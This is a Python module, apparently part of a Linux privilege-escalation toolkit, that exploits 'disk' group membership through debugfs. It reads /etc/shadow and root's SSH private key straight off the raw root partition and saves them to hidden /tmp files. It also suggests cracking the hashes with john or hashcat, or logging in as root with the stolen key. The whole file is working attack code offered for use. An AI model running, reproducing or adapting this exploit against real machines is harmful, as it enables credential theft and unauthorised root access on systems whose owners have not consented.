"""
Disk Group Exploitation
=======================

Exploit disk group membership for direct disk access.

How it works:
1. Disk group has read/write access to block devices
2. Use debugfs to read files directly from disk
3. Can read /etc/shadow, SSH keys, etc.
4. Can also write files (dangerous!)
"""

import os
from typing import Optional, List

from .base import BaseGroupExploit
from ..core.groups import GroupFinding, ExploitResult, ExploitStatus


class DiskExploit(BaseGroupExploit):
    """
    Exploit disk group membership.

    Uses debugfs for direct disk access.
    Success rate: ~85%
    """

    def __init__(self, finding: GroupFinding, verbose: bool = False):
        super().__init__(finding, verbose)
        self._root_partition = None

    def check_available(self) -> bool:
        """Check if disk exploitation is possible"""
        # Check if debugfs exists
        if not self.check_binary_exists('debugfs'):
            self.log("debugfs not found", "error")
            return False

        self.log("debugfs is available", "success")

        # Identify root partition
        self._root_partition = self._find_root_partition()

        if not self._root_partition:
            self.log("Could not identify root partition", "error")
            return False

        self.log(f"Root partition: {self._root_partition}", "success")

        # Check if we can access the device
        if not os.access(self._root_partition, os.R_OK):
            self.log(f"Cannot read {self._root_partition}", "error")
            return False

        self.log("Disk access verified", "success")
        return True

    def _find_root_partition(self) -> Optional[str]:
        """Find the root partition device"""
        # Method 1: df command
        returncode, stdout, _ = self.run_command("df / | tail -1 | awk '{print $1}'")

        if returncode == 0 and stdout.strip():
            return stdout.strip()

        # Method 2: /etc/fstab
        try:
            with open('/etc/fstab', 'r') as f:
                for line in f:
                    if ' / ' in line and not line.startswith('#'):
                        parts = line.split()
                        if parts:
                            return parts[0]
        except:
            pass

        # Method 3: findmnt
        returncode, stdout, _ = self.run_command("findmnt -n -o SOURCE /")

        if returncode == 0 and stdout.strip():
            return stdout.strip()

        return None

    def get_methods(self) -> List[dict]:
        """Get available disk exploitation methods"""
        partition = self._root_partition or '/dev/sda1'

        return [
            {
                'name': 'read_shadow',
                'description': 'Read /etc/shadow for password hashes',
                'command': f"debugfs -R 'cat /etc/shadow' {partition}",
                'interactive': False
            },
            {
                'name': 'read_root_ssh_key',
                'description': 'Read root SSH private key',
                'command': f"debugfs -R 'cat /root/.ssh/id_rsa' {partition}",
                'interactive': False
            },
            {
                'name': 'read_authorized_keys',
                'description': 'Read root authorized_keys',
                'command': f"debugfs -R 'cat /root/.ssh/authorized_keys' {partition}",
                'interactive': False
            },
            {
                'name': 'list_root_home',
                'description': 'List contents of /root',
                'command': f"debugfs -R 'ls -l /root' {partition}",
                'interactive': False
            },
            {
                'name': 'interactive_debugfs',
                'description': 'Launch interactive debugfs session',
                'command': f"debugfs {partition}",
                'interactive': True
            }
        ]

    def exploit(
            self,
            method: Optional[str] = None,
            interactive: bool = False
    ) -> ExploitResult:
        """
        Execute disk exploitation.

        Args:
            method: Specific method to use
            interactive: Allow interactive shell

        Returns:
            ExploitResult
        """
        self.log("Attempting disk group exploitation...", "info")

        # Check availability
        if not self.check_available():
            return ExploitResult(
                finding=self.finding,
                method="N/A",
                status=ExploitStatus.ERROR,
                error="Disk access not available"
            )

        # Get methods with correct partition
        methods = self.get_methods()

        # Select method
        if method:
            selected = next((m for m in methods if m['name'] == method), None)
            if not selected:
                return ExploitResult(
                    finding=self.finding,
                    method=method,
                    status=ExploitStatus.ERROR,
                    error=f"Unknown method: {method}"
                )
        else:
            # Default: read shadow
            selected = methods[0]

        self.log(f"Using method: {selected['name']}", "info")
        self.log(f"Command: {selected['command']}", "info")

        # Handle interactive methods
        if selected.get('interactive') and not interactive:
            self.log("Method requires interactive shell", "warning")
            self.print_methods()

            return ExploitResult(
                finding=self.finding,
                method=selected['name'],
                status=ExploitStatus.MANUAL,
                output=f"Run manually: {selected['command']}"
            )

        # Execute
        if selected.get('interactive') and interactive:
            self.log("Launching interactive debugfs...", "success")
            self.log("Commands: cat, ls, stat, dump <file> <local>", "info")
            os.system(selected['command'])

            return ExploitResult(
                finding=self.finding,
                method=selected['name'],
                status=ExploitStatus.SUCCESS,
                got_root=True
            )
        else:
            # Non-interactive
            returncode, stdout, stderr = self.run_command(selected['command'], timeout=30)

            if returncode == 0 and stdout.strip():
                self.log("Exploitation successful!", "success")

                artifacts = []

                # Save output
                if 'shadow' in selected['name']:
                    output_file = '/tmp/.shadow_dump'
                    with open(output_file, 'w') as f:
                        f.write(stdout)
                    artifacts.append(output_file)

                    self.log(f"Shadow saved to: {output_file}", "success")
                    self.log("Use john or hashcat to crack hashes", "info")

                    print(f"\n{'=' * 60}")
                    print("SHADOW FILE CONTENT")
                    print(f"{'=' * 60}")
                    print(stdout)

                elif 'ssh' in selected['name'].lower():
                    if 'PRIVATE KEY' in stdout:
                        output_file = '/tmp/.root_id_rsa'
                        with open(output_file, 'w') as f:
                            f.write(stdout)
                        os.chmod(output_file, 0o600)
                        artifacts.append(output_file)

                        self.log(f"SSH key saved to: {output_file}", "success")
                        self.log("Use: ssh -i /tmp/.root_id_rsa root@localhost", "info")

                    print(stdout)

                else:
                    print(stdout)

                return ExploitResult(
                    finding=self.finding,
                    method=selected['name'],
                    status=ExploitStatus.SUCCESS,
                    output=stdout,
                    got_root=True,
                    artifacts=artifacts
                )
            else:
                error_msg = stderr or "No output returned"
                self.log(f"Exploitation failed: {error_msg}", "error")

                return ExploitResult(
                    finding=self.finding,
                    method=selected['name'],
                    status=ExploitStatus.FAILED,
                    error=error_msg
                )

    def list_disks(self) -> None:
        """List available disk devices"""
        self.log("Available disk devices:", "info")

        # lsblk
        returncode, stdout, _ = self.run_command("lsblk -o NAME,SIZE,TYPE,MOUNTPOINT")

        if returncode == 0:
            print(stdout)

        # Also show what we can access
        self.log("Checking device access...", "info")

        returncode, stdout, _ = self.run_command("ls -la /dev/sd* /dev/nvme* /dev/vd* 2>/dev/null")

        if returncode == 0:
            print(stdout)